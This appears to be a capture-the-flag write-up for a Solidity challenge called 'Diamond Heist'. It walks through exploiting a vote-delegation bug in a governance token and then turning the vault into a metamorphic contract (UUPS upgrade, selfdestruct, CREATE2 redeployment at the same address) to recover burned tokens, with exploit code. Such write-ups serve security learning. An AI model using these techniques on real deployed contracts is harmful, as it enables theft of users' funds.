# Diamond Heist

## Author

0xkasper

## Description

Agent, we are in desperate need of your help. The King's diamonds have been stolen by a DAO and are locked in a vault.
They are currently voting on a proposal to burn the diamonds forever!

Your mission, should you choose to accept it, is to recover all diamonds and keep them safe until further instructions.

Good luck.

This message will self-destruct in 3.. 2.. 1..

## Solution

### Step 1: 
The *HexensCoin* contract has a bug where if you transfer your tokens it will NOT reset the delegation.
All you have to do
is to make 10 account and circle the tokens through them, each account can delegate to the player until the player has
enough power to *burn* the diamonds in the *Vault*.

### Step 2:

Burn the token in the *Vault*, don't worry, we will recover them later.

```solidity
Vault.governanceCall(abi.encodeWithSignature("burn(address,uint256)", address(Diamond), 31337));
```

### Step 3:

We can make `governanceCall`, we take advantage of this and upgrade the vault to a new implementation of our own.

```solidity
Vault2 v2 = new Vault2();
Vault.governanceCall(abi.encodeWithSignature("upgradeTo(address)", address(v2)));

contract Vault2 is Initializable, UUPSUpgradeable, OwnableUpgradeable {
    function destruct() external {
        selfdestruct(payable(msg.sender));
    }
    function _authorizeUpgrade(address) internal override view {}
}
```

Once we upgrade to the *Vault2*, we just destruct the vault.

### Step 4:

Create a new vault using *VaultFactory* combined with the same *salt* used in the creation of the original vault.
Because *VaultFactory* uses *CREATE2*, it will create the new vault at the same address as the original vault.
Now we can *initialize* the new vault with our own parameters.

```solidity
Vault v3 = VaultFactory.createVault(keccak256("The tea in Nepal is very hot. But the coffee in Peru is much hotter."));
v3.initialize(address(new FakeToken()), address(new FakeToken()));
```

### Step 5:

Upgrade to another vault implementation which has a *mint* function, remember this contract has the exact address as 
the original vault that burnt the diamonds.

```solidity
Vault4 v4 = new Vault4();
v3.upgradeTo(address(v4));
Vault4(address(v3)).unburn(player, diamond, amount);

contract Vault4 is Initializable, UUPSUpgradeable, OwnableUpgradeable {
    function unburn(address player, Diamond diamond, uint amount) external {
        diamond.transfer(player, amount);
    }

    function _authorizeUpgrade(address) internal override view {
    }
}
```

### Read More

[Metamorphic Smart Contracts](https://mixbytes.io/blog/metamorphic-smart-contracts-is-evm-code-truly-immutable)